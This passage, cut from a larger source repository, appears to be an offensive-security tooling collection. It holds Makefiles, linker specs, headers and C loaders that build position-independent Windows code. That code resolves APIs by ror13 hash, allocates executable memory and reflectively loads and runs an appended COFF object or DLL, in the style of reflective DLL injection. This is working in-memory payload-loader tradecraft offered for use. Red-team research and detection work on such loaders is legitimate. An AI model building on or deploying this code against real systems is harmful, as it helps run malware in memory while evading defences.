SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_obj/loader.spec

```text
#
# Simple COFF Loader build spec
#

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		# +optimize is our link-time optimizer, gets rid of unused functions
		make pic +gofirst +optimize

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution
		dfr "_resolve" "ror13"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# load our Reflective DLL argument AND link it into our PIC as my_data section
		push $OBJECT
			make object +optimize
			export
			link "my_data"

		# this is OPTIONAL, it will dump the disassembled loader.x86.o to out.txt
		disassemble "out.txt"
	
	# we're done, export the final blob
	export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		dfr "resolve" "ror13"
		mergelib "../libtcg/libtcg.x64.zip"

		push $OBJECT
			make object +optimize
			export
			link "my_data"

		disassemble "out.txt"

		export

```

## File: simple_obj/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o

clean:
	rm -rf bin

```

## File: simple_obj/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __BOFDATA__[0] __attribute__((section("my_data")));

char * findAppendedPICO() {
	return (char *)&__BOFDATA__;
}

/*
 * Our PICO loader, have fun, go nuts!
 */
void go() {
	char        * dstCode;
	char        * dstData;
	char        * src;
	IMPORTFUNCS   funcs;

	/* find our DLL appended to this PIC */
	src = findAppendedPICO();

	/* allocate memory for our PICO */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/* setup our IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* load our pico into our destination address, thanks! */
	PicoLoad(&funcs, src, dstCode, dstData);

	/* execute our pico */
	PicoEntryPoint(src, dstCode) (NULL);
}

```

## File: simple_obj/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_objmix/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_objmix/link.spec

```text
#
# Handle the DLL/COFF-specific linking parts of our build process
#

# x86.dll is the first label Crystal Palace will use, when acting on an x86 DLL argument.
# If there's no x86.dll target, Crystal Palace will fall back to the x86 target.
x86.dll:
	# given that we're working with a DLL, we're going to remap the symbol go_dll() to go()
	# to make it our entry point. The link-time optimizer will get rid of the unused go_object().
	remap "_go_dll" "_go"

	# let's push our DLL content onto the stack and link it with my_data
	push $DLL
		link "my_data"

x64.dll:
	remap "go_dll" "go"

	push $DLL
		link "my_data"

# x86.o is the first label Crystal Palace will use, when acting on an x86 COFF argument.
# If there's no x86.o target, Crystal Palace will fall back to the x86 target.
x86.o:
	# Sametype of thing as our x86.dll counterpart. We remap go_object() to go() to make it
	# our entry point. The link-time optimizer will get rid of the unused go_dll()
	remap "_go_object" "_go"

	# push our COFF content onto the stack, turn it into a PICO and link it to my_data
	push $OBJECT
		make object +optimize
		export
		link "my_data"

x64.o:
	remap "go_object" "go"

	push $OBJECT
		make object +optimize
		export
		link "my_data"

```

## File: simple_objmix/loader.spec

```text
#
# Simple COFF and DLL Loader build spec
#

x86:
	# load our x86 .o file AND turn it into position-independent code
	load "bin/loader.x86.o"
		# +gofirst moves go() to position 0 of our PIC
		make pic +gofirst

		# OPT into x86 program fixes to allow data references without code hacks
		fixptrs "_caller"

		# OPT into PIC dynamic function resolution
		dfr "_resolve" "ror13"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		# run link.spec to handle our $OBJECT or $DLL setup and linking
		run "link.spec"
	
		# we're done, export the final blob
		export

x64:
	load "bin/loader.x64.o"
		make pic +gofirst +optimize

		dfr "resolve" "ror13"
		mergelib "../libtcg/libtcg.x64.zip"

		run "link.spec"

		export

```

## File: simple_objmix/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/loader.c -o bin/loader.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/loader.c -o bin/loader.x64.o

clean:
	rm -rf bin

```

## File: simple_objmix/src/loader.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <windows.h>
#include "tcg.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

/*
 * This is our opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" in loader.spec
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

/*
 * This is our opt-in function to help fix ptrs in x86 PIC. See fixptrs _caller" in loader.spec
 */
#ifdef WIN_X86
__declspec(noinline) ULONG_PTR caller( VOID ) { return (ULONG_PTR)WIN_GET_CALLER(); }
#endif

/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char __DATA__[0] __attribute__((section("my_data")));

char * findAppendedCapability() {
	return (char *)&__DATA__;
}

/*
 * Where is go()?
 *
 * Notice that we haven't defined a go() entrypoint here. Instead, we have two candidate entry
 * points. One for a PICO and one for a DLL. The link.spec file will remap go_dll or go_object to
 * go() at link-time, based on whether a DLL or COFF is presented. This allows us to build one
 * program to handle either a DLL or COFF capability. Crystal Palace's link-time optimization
 * will remove the unused entry point candidate.
 */

void go_object() {
	char        * src;
	IMPORTFUNCS   funcs;
	char       * dstCode;
	char       * dstData;

	/* find our DLL or COFF appended to this PIC */
	src = findAppendedCapability();

	/* resolve the functions we'll need */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* allocate memory for our PICO */
	dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
	dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );

	/* load our pico into our destination address, thanks! */
	PicoLoad(&funcs, src, dstCode, dstData);

	/* execute our pico */
	PicoEntryPoint(src, dstCode) (NULL);
}

void go_dll() {
	char        * src;
	IMPORTFUNCS   funcs;
	char       * dst;
	DLLDATA      data;

	/* find our DLL or COFF appended to this PIC */
	src = findAppendedCapability();

	/* resolve the functions we'll need */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* parse our DLL! */
	ParseDLL(src, &data);

	/* allocate memory for it! */
	dst = KERNEL32$VirtualAlloc( NULL, SizeOfDLL(&data), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	/* load the damned thing */
	LoadDLL(&data, src, dst);

	/* process the imports */
	ProcessImports(&funcs, &data, dst);

	/* excute it! */
	EntryPoint(&data, dst)((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL);
}

```

## File: simple_objmix/src/tcg.h

```h
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

// linker intrinsic for __transfer (x64 only)
#ifdef WIN_X64
typedef void (* TRANSFERFUNC)();
void __transfer(TRANSFERFUNC func) __attribute__((noreturn));
#endif

// used by both the Pico Loader and DLL loader
typedef struct {
	__typeof__(LoadLibraryA)   * LoadLibraryA;
	__typeof__(GetProcAddress) * GetProcAddress;
} IMPORTFUNCS;

// used throughout TCG and useful for parsing preplen'd content
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;

// linker intrinsic to map a function hash to a hook registered via Crystal Palace
FARPROC __resolve_hook(DWORD funcHash);

/*
 * Structs used by our DLL loader
 */

#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )
#define DEREF( name )*(UINT_PTR *)(name)

typedef struct {
	IMAGE_DOS_HEADER      * DosHeader;
	IMAGE_NT_HEADERS      * NtHeaders;
	IMAGE_OPTIONAL_HEADER * OptionalHeader;
} DLLDATA;

/*
 * utility functions
 */
DWORD adler32sum(unsigned char * buffer, DWORD length);
DWORD ror13hash(const char * c);

/*
 * printf-style debugging.
 */
void dprintf(char * format, ...);

/*
 * PICO running functions
 */
typedef void (*PICOMAIN_FUNC)(char * arg);

PICOMAIN_FUNC PicoGetExport(char * src, char * base, int tag);
PICOMAIN_FUNC PicoEntryPoint(char * src, char * base);
int PicoCodeSize(char * src);
int PicoDataSize(char * src);
void PicoLoad(IMPORTFUNCS * funcs, char * src, char * dstCode, char * dstData);
_RESOURCE * PicoGetUnwindData(char * src, char * base);

/*
 * Resolve functions by walking the export address table
 */
FARPROC findFunctionByHash(HANDLE hModule, DWORD wantedFunctionHash);
HANDLE findModuleByHash(DWORD moduleHash);

/*
 * DLL parsing and loading functions
 */
typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

DLLMAIN_FUNC EntryPoint(DLLDATA * dll, void * base);
IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll, UINT entry);
void LoadDLL(DLLDATA * dll, char * src, char * dst);
void LoadSections(DLLDATA * dll, char * src, char * dst);
void ParseDLL(char * src, DLLDATA * data);
void ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll, char * dst);
void ProcessRelocations(DLLDATA * dll, char * src, char * dst);
DWORD SizeOfDLL(DLLDATA * data);

/*
 * A macro to figure out our caller
 * https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1
 */
#ifdef __MINGW32__
#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))
#else
#pragma intrinsic(_ReturnAddress)
#define WIN_GET_CALLER() _ReturnAddress()
#endif

```

## File: simple_pic/LICENSE.txt

```text
Copyright 2025-2026 Adversary Fan Fiction Writers Guild

Redistribution and use in source and binary forms, with or without modification, are
permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this list of
conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice, this list of
conditions and the following disclaimer in the documentation and/or other materials provided
with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written
permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Copyright (c) 2011, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
All rights reserved.
 
Redistribution and use in source and binary forms, with or without modification, are permitted 
provided that the following conditions are met:
 
    * Redistributions of source code must retain the above copyright notice, this list of 
conditions and the following disclaimer.
 
    * Redistributions in binary form must reproduce the above copyright notice, this list of 
conditions and the following disclaimer in the documentation and/or other materials provided 
with the distribution.
 
    * Neither the name of Harmony Security nor the names of its contributors may be used to
endorse or promote products derived from this software without specific prior written permission.
 
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
POSSIBILITY OF SUCH DAMAGE.

```

## File: simple_pic/loader.spec

```text
#
# Is this a loader? Nope! Straight to PIC! This demonstrates how to act on an arbitrary PICO
# and turn it into PIC. 
#

x86:
	push $OBJECT
		make pic +optimize +gofirst

		# apply our PIC service module to this object. This will set dfr/fixbss/fixptrs
		# and merge in code to implement them
		run "services.spec"

		# merge the Tradecraft Garden Library into our PIC
		mergelib "../libtcg/libtcg.x86.zip"

		export

x64:
	push $OBJECT
		make pic +optimize +gofirst

		run "services.spec"
		mergelib "../libtcg/libtcg.x64.zip"

		export

```

## File: simple_pic/Makefile

```text
CC=i686-w64-mingw32-gcc
CC_64=x86_64-w64-mingw32-gcc
CFLAGS=-O1 -fno-jump-tables -fno-omit-frame-pointer -shared -Wall -Wno-pointer-arith

.PHONY: all x86 x64 clean

all: x86 x64

bin:
	mkdir -p bin

x86: bin
	$(CC) -DWIN_X86 $(CFLAGS) -c src/services.c -o bin/services.x86.o

x64: bin
	$(CC_64) -DWIN_X64 $(CFLAGS) -c src/services.c -o bin/services.x64.o

clean:
	rm -rf bin

```

## File: simple_pic/services.spec

```text
#
# This file is includable in other projects to bring PIC bootstrap services there
# Use: run "path/to/services.spec"

x86:
	# load our x86 PIC services module and merge it into our parent
	load "bin/services.x86.o"
		merge

	# OPT into x86 program fixes to allow data references without code hacks
	fixptrs "_caller"

	# fix the .bss section to give us some globals again
	fixbss "_getBSS"

	# OPT into PIC dynamic function resolution
	# * _resolve is for modules that we know are loaded
	# * punt anything else over to _resolve_ext so we can load the module (if needed)
	dfr "_resolve" "ror13" "KERNEL32, NTDLL"
	dfr "_resolve_ext" "strings"

	# Protect LibTCG's ror13 lookup from hooks to GetProcAddress. The hook, conceptually,
	# isn't a concern. But, if a hook calls dprintf, or references something that does,
	# Crystal Palace will throw an error. The ror13 resolver only uses GPA to resolve
	# forwarded functions.
	preserve "KERNEL32$GetProcAddress" "_findFunctionByHash"

x64:
	load "bin/services.x64.o"
		merge

	fixbss "getBSS"

	dfr "resolve" "ror13" "KERNEL32, NTDLL"
	dfr "resolve_ext" "strings"

	preserve "KERNEL32$GetProcAddress" "findFunctionByHash"

```

## File: simple_pic/src/services.c

```c
/*
 * Copyright 2025-2026 Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
